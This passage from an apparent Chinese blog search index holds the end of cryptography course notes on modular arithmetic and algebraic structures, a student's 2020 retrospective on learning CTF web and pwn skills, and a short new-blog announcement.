1,2,…,k)</li></ul></li><li><p>同余类/等价类/模n剩余类</p><ul><li>与a模n同余的全体成为a的同余类记为$[a]_n$</li><li>$Z_n$为模n的等价类集合</li></ul></li><li><p>等价类性质</p><ul><li>在做mod n的加法和乘法时，等价类的元素可以替换，结果不变</li></ul></li><li><p>模运算性质</p><ul><li>加运算和乘运算先做模和后做模不影响结果</li><li>满足交换律，结合律，分配律</li><li>单位元，0是加法单位元，1是乘法单位元</li></ul></li></ul><h2 id="3-模指数运算"><a href="#3-模指数运算" class="headerlink" title="3.模指数运算"></a>3.模指数运算</h2><p>模指数运算</p><ul><li>$a^m \pmod p$</li><li>思路：现将m用二进制表示</li><li>？快速指数运算查询</li><li>阶 $ord_n(a)$， 满足 $a^m \equiv $ 1 mod n 的最小正整数m为模n下a的阶</li><li>$ord_n(a)$ = m，$ a^k \equiv 1$ mod n的充要条件是k为m的倍数</li></ul><h2 id="4-费马定理和欧拉定理"><a href="#4-费马定理和欧拉定理" class="headerlink" title="4.费马定理和欧拉定理"></a>4.费马定理和欧拉定理</h2><ul><li>费马定理<ul><li>p是素数，a是正整数，且gcd(a,p) = 1,则$a^{p-1}\equiv1$ mod p</li><li>$aa^{p-2}\equiv$ mod p 或者 $a^{-1} \equiv a^{p-2}$ mod p</li><li>$2^{100}  $ mod 13 = 3 (满足费马定理，即$2^{12} \equiv 1$ mod 13，即$2^{96} \equiv 1$ mod 13)  </li></ul></li></ul><h2 id="5-素性检测"><a href="#5-素性检测" class="headerlink" title="5.素性检测"></a>5.素性检测</h2><p>素性检测就是对给定的数检验是否为素数</p><p>费马定理的逆命题不成立，伪素数（卡米歇尔数）</p><ul><li>埃拉托斯散筛法</li><li><p>Miller-Rabin概率检测法</p><h2 id="6-欧几里得算法"><a href="#6-欧几里得算法" class="headerlink" title="6.欧几里得算法"></a>6.欧几里得算法</h2></li></ul><p>辗转相除法</p><h2 id="7-中国剩余定理"><a href="#7-中国剩余定理" class="headerlink" title="7.中国剩余定理"></a>7.中国剩余定理</h2><p>小数重构大数</p><p>大数用小数表示</p><h2 id="8-群环域"><a href="#8-群环域" class="headerlink" title="8.群环域"></a>8.群环域</h2><ul><li><p>代数系统</p><ul><li>代数系统是一种数学模型，包含要处理的数学对象的集合及集合上的关系或运算。</li><li>群，环，域都是代数系统。</li></ul></li><li><p>半群</p><ul><li>任取ab属于S，a和b的运算*都在S中，则S对运算*是封闭的</li><li>满足结合律</li><li>满足以上两点，称为<G,*>为半群</li></ul></li><li><p>群</p><ul><li>封闭性</li><li>结合律</li><li>单位元：$a<em>e = e</em>a = a$，e称为$<G,*>$的单位元</li><li>逆元：对任取a属于G，存在元素$a^{-1}$,$a <em> a^{-1} = a^{-1} </em> a = e$</li><li>满足以上几点称为$<G,*>$是群</li><li>实例 $<Z_8,+>$，模8加</li><li>实例 XOR，模2加</li><li>实例，加法群<ul><li>对任意n大于等于1，整数模n的集合构成一个包含n个元素的有限模n加法群，单位元是0，群中任一元素a，它的逆元是n-a，这个群记为$Z_n$</li></ul></li><li><p>实例，乘法群不是群，是幺半群，不满足逆元的条件</p></li><li><p>乘法群 $Z_n^*$</p><ul><li>$Z_n^*={x\in Z_n:gcd(x,n)=1}$，小于n的非负整数且与n互素</li><li>模n乘法群，单位元e = 1</li><li>是abel群，$|Z_n^*| = \psi(n)$</li><li>对素数p，$Z_p^* = Z_p - 0$</li></ul></li></ul></li></ul><ul><li><p>Abel群</p><ul><li>运算*表示加法时，称为加法群</li><li>乘法，乘法群</li><li>若G的元素是有限的，称为有限群，否则为无限群</li><li>有限群中，G的元素个数称为群G的阶数，表示为$|G|$ or $#G$</li><li>还满足交换律，则称为群$<G,*>$为Abel群</li><li><p>密码学中用到的几乎都为Abel群</p></li><li><p>实例 $<Z_8,+>$，模8加，阶为8</p></li></ul></li></ul><ul><li>循环群<ul><li>$g^i = a$，a为任意的一个元素，g为生成元或本原元</li><li>即能够自己对自己做运算，最终能够遍历群</li><li>实例<ul><li>$Z_4$</li><li>$Z_p^*$，p为素数，肯定存在生成元<ul><li>定理$Z_n^*$每一个元素都有乘法逆元</li><li>并不是每一个元素都是生成元</li></ul></li></ul></li><li>本原元的存在性<ul><li>对模素数p<ul><li><ol><li>其生成元必定存在</li><li>当g为生成元且p与p-1互素时，$g^a$  mod p也是生成元</li><li>生成元个数为$\psi(p-1)$</li></ol></li></ul></li></ul></li></ul></li></ul><ul><li>元素的阶<ul><li>拉格朗日定理推论，提供了群的阶和群中元素阶的关系</li></ul></li></ul><ul><li>环<ul><li>$<R,+>$是Abel群</li><li>$<R,*>$是半群</li><li>分配律</li><li>$<R,+,*>$是环</li></ul></li></ul><ul><li>域<ul><li>$<F,+>$ 是Abel群，0是+的单位元</li><li>$<F-0,*>$ 是Abel群</li><li>分配律</li><li>$<F,+,*>$是域</li></ul></li></ul><ul><li>有限域<ul><li>若q是素数的幂，即$q = p^n$ ，p是素数，n是正整数，则阶为q的域记为GF(q)</li></ul></li></ul><h2 id="9-离散对数"><a href="#9-离散对数" class="headerlink" title="9.离散对数"></a>9.离散对数</h2><h2 id="10-平方剩余"><a href="#10-平方剩余" class="headerlink" title="10.平方剩余"></a>10.平方剩余</h2><h2 id="11-小结"><a href="#11-小结" class="headerlink" title="11.小结"></a>11.小结</h2>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 校内课程笔记 </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年度总结</title>
      <link href="2021/03/05/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>2021/03/05/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="1-3月"><a href="#1-3月" class="headerlink" title="1-3月"></a>1-3月</h2><p>1-3月啥也不会，铁fw罢了，在学校摸摸鱼，电子人，电脑小白-.-</p><h2 id="3月"><a href="#3月" class="headerlink" title="3月"></a>3月</h2><p>接触网络安全源于一个电影，挺感兴趣的，在全网搜索相关文献资料啥的，也啥也不会，后来发现ctf比赛，想着学学吧，从web安全开始了，记得一开始是听的哔哩哔哩课程，什么从入门到入狱啥的，师傅其实讲的很好，那个时候学会了sql注入，xss啥的，不过只知道原理，并不会相关操作。<br>后来发现一个网站叫bugku，开始刷题了，一开始过程是自闭的，什么f12都不会，然后开始陆陆续续学JavaScript前端啥的，php和mysql也简单学学，后来面向wp做题有了一点点感觉。</p><h2 id="4-5月"><a href="#4-5月" class="headerlink" title="4-5月"></a>4-5月</h2><p>由于疫情的爆发没有开学，上网课，就很nice，然后就不听课，开始疯狂自学做题，当时啥都学早6点到晚12点左右，python php JavaScript linux …… 反正就是什么都会一点但是不精细。<br>后来打比赛，直接自闭了，认识了堆堆师傅，当时堆堆师傅主方向是web副方向是pwn，很羡慕，太羡慕pwn👴👴了，然后堆堆告诉我一个网站叫buuoj，让我开始做那个东西，然后就开始入坑buu了，记得第一道题好像是目录穿越还是反序列化不太记得了，从白天一直做到凌晨，各种抄wp复现，打击太大了，然后堆堆师傅凌晨4点多教我怎么做呜呜呜太感动了，然后告诉我说极客大挑战系列的题目比较简单，我就开始挑简单题做。然后从哔哩哔哩疯狂听课，后来学了两周misc，在MRCTF新生赛上出了一两个web和四五道misc，太满足了，第一次找到成就感，然后后来一个啥比赛又整自闭了。然后进入迷茫期。中间我帮七星师傅了录了一期长亭科技师傅做的pwn课程，那是什么鬼啊从头到尾全程懵逼，就硬生生给👴听睡着了。</p><h2 id="6-7月"><a href="#6-7月" class="headerlink" title="6-7月"></a>6-7月</h2><p>下学期快考试了，然后转专业啥的，由于上学期成绩还可以，然后就想着转个专业8，本来是想选网安的，但是竟然不能转因为是新开的专业啊可恶，然后又想转计科，但是看到人才培养方案发现网络专业竟然有安全课于是来到了网络专业，后话了（<br>然后快考试了，啥也没学这学期，开始疯狂补课，电路从第三章👴就没听懂过，猴博士yyds，高数二边听课边玩游戏，高数叔yyds。最终都考的还行。然后web方向面临瓶颈了，开始过渡pwn。<br>没有课程，从汇编开始学，贼痛苦，晚上做梦都是噩梦。反正那段时间挺难受的。<br>用了一段时间把wiki上的大部分栈知识点搞定之后开始冲刺堆部分。<br>怎么说呢，堆部分刚开始对于👴来说简直是地狱。没有学过数据结构，文献看不懂，又没有视频资料，七星师傅群里也没有pwn手，就很难受，当时星盟的一个师傅出了一套pwn课程，堆部分只有一丢丢，但是很满足了，慢慢啃wiki，最后还是学到了很多东西。</p><h2 id="8-9月"><a href="#8-9月" class="headerlink" title="8-9月"></a>8-9月</h2><p>旅游，各种玩耍，咕了</p><h2 id="9-12月"><a href="#9-12月" class="headerlink" title="9-12月"></a>9-12月</h2><p>下学期开始了，新班级，带了一个舍友开始学ctf，同班同学碰见一个特别强的师傅，后来认识了一下才知道这个师傅是计算机大类的系第一，高中就开始搞技术了，web手，膜。然后继续pwn，基本上一天两到三个buu吧，不会就记录查wp，技术上是有一定进步的，然后打了省的一个小比赛拿了一个二等奖，后来跟web师傅组队又打了一个线下赛拿了第一名，挺满意的。然后陆陆续续做题，把buu的一分pwn做完了，当时pwn总榜排名也进入前50了，然后就是复习课准备考试了，中间还成立了我们校的第一个ctf社团，感谢各位老师的支持和帮助</p><h2 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h2><p>最终寒假来了，摸了一个寒假，学了几天的运维</p><p>2021开学了，准备继续学pwn，堆部分还没有结束，还是跟师傅们差的太远，不过这一年认识很多hxd，校内师傅不用说了，堆堆师傅，七星师傅，雪殇师傅，Mz1师傅，Fz师傅，N神，低调的L0ne1y师傅等等，路很长，加油，共勉！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>New</title>
      <link href="2021/03/05/New/"/>
      <url>2021/03/05/New/</url>
      
        <content type="html"><![CDATA[<h3 id="新博客！"><a href="#新博客！" class="headerlink" title="新博客！"></a>新博客！</h3><p>原博客地址：<a href="https://cnblogs.com/lemon629/">https://cnblogs.com/lemon629/</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
